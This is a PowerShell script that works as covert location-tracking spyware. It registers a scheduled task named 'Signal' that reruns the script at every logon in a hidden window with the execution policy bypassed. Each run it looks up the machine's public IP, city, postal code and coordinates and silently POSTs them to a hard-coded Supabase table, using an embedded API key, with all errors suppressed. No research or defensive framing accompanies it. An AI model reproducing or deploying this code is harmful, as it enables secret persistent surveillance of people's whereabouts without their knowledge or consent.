[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$SupabaseUrl = "https://xnqqunnnyifoduksffjq.supabase.co",

    [Parameter(Mandatory = $false)]
    [string]$SupabaseApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhucXF1bm5ueWlmb2R1a3NmZmpxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY3Mjg3NDAsImV4cCI6MjEwMjMwNDc0MH0.hICo7htTHD6QC5PQTPpikyjgPPUP4N6ZZfUepv4lBl8",

    [Parameter(Mandatory = $false)]
    [string]$TableName = "ip_lookups"
)

$ErrorActionPreference = 'SilentlyContinue'

$taskName = "Signal"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$scriptPath`""
    $trigger  = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 1)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force -ErrorAction SilentlyContinue | Out-Null
}

try {
    $response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,message,query,city,regionName,country,countryCode,zip,lat,lon,isp,org,timezone" -Method Get

    if ($response.status -eq 'success') {
        $result = [PSCustomObject]@{
            PublicIP    = $response.query
            City        = $response.city
            Region      = $response.regionName
            Country     = "$($response.country) ($($response.countryCode))"
            PostalCode  = $response.zip
            Latitude    = $response.lat
            Longitude   = $response.lon
            ISP         = $response.isp
            Org         = $response.org
            TimeZone    = $response.timezone
        }

        $endpoint = "$($SupabaseUrl.TrimEnd('/'))/rest/v1/$TableName"

        $headers = @{
            "apikey"        = $SupabaseApiKey
            "Authorization" = "Bearer $SupabaseApiKey"
            "Content-Type"  = "application/json"
            "Prefer"        = "return=minimal"
        }

        $body = @{
            public_ip   = $result.PublicIP
            city        = $result.City
            region      = $result.Region
            country     = $result.Country
            postal_code = $result.PostalCode
            latitude    = $result.Latitude
            longitude   = $result.Longitude
            isp         = $result.ISP
            org         = $result.Org
            time_zone   = $result.TimeZone
        } | ConvertTo-Json

        Invoke-RestMethod -Uri $endpoint -Method Post -Headers $headers -Body $body | Out-Null
    }
}
catch {}
